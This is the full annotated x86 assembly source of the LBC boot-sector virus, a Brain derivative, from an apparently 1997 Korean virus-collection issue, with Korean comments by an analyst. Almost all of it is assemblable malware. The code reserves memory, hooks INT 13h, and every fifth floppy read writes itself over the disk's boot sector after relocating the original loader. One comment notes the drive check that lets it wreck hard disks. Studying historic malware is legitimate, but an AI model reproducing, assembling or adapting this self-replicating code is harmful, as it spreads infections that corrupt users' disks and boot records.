;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                             LBC virus                     CVC #02  97/09
;
; 바이러스명 : LBC
; 제작자 : 모름 (Njh ?)
; 제작지 : 한국 (89년 발견)
; 분석자 : KOV
; 어셈블러 : MASM, TASM
;
; 종류 : 플로피,MBR
; 암호 : x
; 다형성 : x
; 은폐 : x
; 설명 : 구한 소스를 KOV 가 일부 수정한 것이다. 소스를 작성하신 분께 감사드린
;        다.
;        Brain 바이러스를 바탕에 두고 제작한 바이러스이다.
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 CODE           SEGMENT
                ASSUME  CS:CODE, DS:CODE

        ORG 100h
START:          CLI                             ; 인터럽트 마스크
                JMP     SHORT MAIN              ;
        NOP
                                                ; Brain 바이러스 식별자
                DW      1234h                   ; 사용하지 않는 부분
LBC_MARK        DW      6845h                   ; 바이러스 식별자

MAIN:           XOR     AX,  AX                 ; 프로그램시작 & 프로그램 초기화
        MOV DS,  AX
        MOV SS,  AX
        MOV SP,  0FFF0h
                STI                             ; 인터럽트 플래그 세트

                MOV     BX,  0413h              ; 메모리 크기 검사
        MOV AX,  [BX]
        DEC AX
                DEC     AX                      ; 메모리 크기 감소 (2 KB)
        MOV [BX],  AX

                MOV     CL,  06h                ; 옮길 곳의 세그먼트 계산
        SHL AX,  CL
        MOV ES,  AX

                MOV     SI,  7C00h              ; 자신의 오프셋
                MOV     DI,  0100h              ; 옮길 곳의 오프셋
        MOV CX,  0200h
        CLD
                REPZ    MOVSB                   ; 프로그램 상주
        PUSH    ES                ; 상주된 바이러스 프로그램으로 점프
        MOV AX,  OFFSET CHANGE_INT13
        PUSH    AX
        RETF

                                                ; 상위 영역 에서 시작됨
CHANGE_INT13:   MOV     BX,  004Ch              ; 인터럽트 벡터 변경
                MOV     CX,  [BX]               ; 원래의 INT 13h의 오프셋
                MOV     DX,  [BX + 02h]         ; 원래의 INT 13h의 세그먼트
                MOV     AX,  OFFSET NEW_INT13   ; 새로운 INT 13h의 오프셋
        MOV [BX],  AX
                MOV     AX,  CS                 ; 새로운 INT 13h의 세그먼트
        MOV [BX + 02],  AX
        MOV DS,  AX
                MOV     WORD PTR OLD_INT13O,CX  ; 원래 INT 13h의 오프셋 저장
                MOV     WORD PTR OLD_INT13S,DX  ; 원래 INT 13h의 세그먼트 저장


                                                ; 원래의 부트 스트랩 로더 읽기
                MOV     BYTE PTR FUNC_NUM,02h   ; INT 13h의 파라미터 설정
                MOV     BYTE PTR BOOT_DRIVE,00h
                MOV     WORD PTR TRACK_SECTOR,0003h
                MOV     BYTE PTR BOOT_HEAD,01h

                XOR     AX,  AX                 ; 원래의 로더의 세그먼트
        PUSH    AX
                MOV     ES,  AX                 ; INT 13h를 위한 버퍼 세그먼트
                MOV     AX,  7C00h              ; 원래 로더의 오프셋
        PUSH    AX
                MOV     WORD PTR BUFFERS,  AX   ; INT 13h를 위한 버퍼 오프셋

        CALL    INT_13H
        JNB NO_ROM_BASIC
                INT     18h                     ; 디스켓을 읽을 수 없을 경우
                                                ; ROM BASIC 작동 (최근 컴퓨터
                                                ; 에는 없음)

NO_ROM_BASIC:   RETF                  ; 원래의 로더를 읽은 경우 그곳으로 점프


OLD_INT13O      DW      0EC59h                  ; 원래 INT 13h의 오프셋
OLD_INT13S      DW      0F000h                  ; 원래 INT 13h의 세그먼트
INTERVAL        DB      05h                     ; 감염 간격(매 5회 마다 감염)
FUNC_NUM        DB      03h                     ; 기능 코드 (2=읽기,3=쓰기)
BOOT_DRIVE      DB      00h                     ; 드라이브 번호
BOOT_HEAD       DB      00h                     ; 헤드 번호
TRACK_SECTOR    DW      0001h                   ; 트랙과 섹터 번호
BUFFERS         DW      0100h                   ; 버퍼의 오프셋

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;               Int     13h
;
NEW_INT13:      STI                             ; 인터럽트 플래그 SET
                CMP     AH,  02h                ; 디스크 읽기 검사
                JNZ     NO_INFECT

                CMP     DL,  01h                ; A 또는 B 드라이브인가 검사
                JG      NO_INFECT               ; 이값이 문제의 값으로

; 만약 JB 등으로 바꾼다면 하드 디스크를 파괴 시키는 일은 없다.
; 즉            CMP     DL,02h
;               JB      NO_INFECT2 하면 하드 디스크를 파괴하는 일은 없다.
; 하드 디스크에 LBC 바이러스에 감염되면 부팅이 되지 않는데 그 이유는 바이러스
; 제작자는 원래 플로피 용으로 제작했기 때문에 하드 디스크로 부팅하지 않기 때
; 문이다.
;
                DEC     BYTE PTR CS:INTERVAL    ; 감염 간격 검사
                JNZ     NO_INFECT

                MOV     BYTE PTR CS:INTERVAL, 05h ; 감염 간격 초기화

                PUSH    AX                      ; 레지스터 대피
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    ES
        PUSH    DS

                PUSH    CS                      ; 데이타 세그먼트 조정
        POP DS

                                                ; 현재 사용중인 디스켓의 부트 섹터 읽기
                MOV     BYTE PTR BOOT_DRIVE, DL ; INT 13h를 위한 파라미터 설정
                MOV     BYTE PTR BOOT_HEAD, 00h
                MOV     WORD PTR TRACK_SECTOR, 0001h
                MOV     WORD PTR BUFFERS, 0400h
                MOV     BYTE PTR FUNC_NUM, 02h

                CALL    ES_SETING               ; ES 조정 후 원래의 INT 13h 실행
                JB      NO_INFECT1              ; 읽기 에러일때는 포기

                                                ; 이미 감염된 디스켓인가 검사
                MOV     AX,  LBC_MARK           ; 바이러스 식별자 검사
        MOV BX,  OFFSET LBC_MARK + 300h
        CMP AX,  [BX]
                JNZ     INFECT                  ; 감염되지 않은 디스켓이면 감염
                JMP     SHORT NO_INFECT1        ; 감염된 디스켓이면 재 감염 포기
        NOP


;               현재 사용중인 디스켓 감염
;               원래의 부트스트랩 로더 프로그램을 논리 섹터 11에 쓰기 (360 KB의
;               경우)
INFECT:         MOV     BYTE PTR FUNC_NUM,03h   ; INT 13h를 위한 파라미터(쓰기)
                MOV     BYTE PTR BOOT_HEAD,01h  ; 논리 섹터 10
                MOV     WORD PTR TRACK_SECTOR,0003h
                CALL    ES_SETING               ; ES 조정 후 원래의 INT 13h 실행
                JB      NO_INFECT1              ; 쓰기 에러인 경우 감염 포기


;               바이러스 로더 프로그램 (LBC)를 부트 섹터에 쓰기
        MOV BYTE PTR BOOT_HEAD,  00h
        MOV WORD PTR TRACK_SECTOR,  0001h
        MOV WORD PTR BUFFERS,  0100h
        CALL    ES_SETING            ; ES 조정 후 원래의 INT 13h 실행


NO_INFECT1:     POP     DS                      ; 레지스터 복구
        POP ES
        POP DX
        POP CX
        POP BX
        POP AX


NO_INFECT:      JMP     DWORD PTR CS:[OLD_INT13O]     ; 원래의 INT 13h로 점프

ES_SETING:      PUSH    CS                      ; ES 레지스터 조정
        POP ES
INT_13H:        MOV     CX,  0004h              ; 재시도 횟수 설정

RETRY:          PUSH    CX                      ; 재시도 횟수 저장

;               INT 13h의 파라미터 설정
                MOV     AH,  FUNC_NUM           ; 기능 코드
                MOV     AL,  01h                ; 섹터 수
                MOV     BX,  BUFFERS            ; 버퍼 오프셋
                MOV     CX,  TRACK_SECTOR       ; 트랙과 섹터 번호
                MOV     DH,  BOOT_HEAD          ; 헤드 번호
                MOV     DL,  BOOT_DRIVE         ; 드라이브 번호

                PUSHF                           ; 인터럽트 리턴을 위한 스택 조정
                CALL    DWORD PTR [OLD_INT13O]  ; 원래의 INT 13h 호출
                JNB     NO_ERROR                ; 에러 검사

                MOV     AH,  00h                ; 에러 발생시 디스크 리세트
                PUSHF                           ; 인터럽트 리턴을 위한 스택 조정
                CALL    DWORD PTR [OLD_INT13O]  ; 원래의 INT 13h 호출

                POP     CX                      ; 재시도 횟수 복구
                LOOP    RETRY                   ; 재시도

                STC                             ; 에러 선언을 위한 캐리 세트
        JMP SHORT RETURN
        NOP
NO_ERROR:       POP     CX                      ; 스택 조정
RETURN:     RET                       ; 상주된 바이러스 프로그램으로 복귀



                DB      ' virse program   messge Njh to Lbc '
; virus program message Njh to Lbc
; 를 잘못 적은것 같다. 제작자는 아마도 나이 어린 학생인것 같다.

                DB      166 DUP (00h)

CODE        ENDS
        END START

;
; 국내에는 LBC 바이러스를 변형한 바이러스들이 많다.
; 다음 기회에 플로피 전용(?)의 LBC 바이러스를 어떻게 변형 했는지
; 변형 바이러스를 가지고 분석해 보겠다.
;
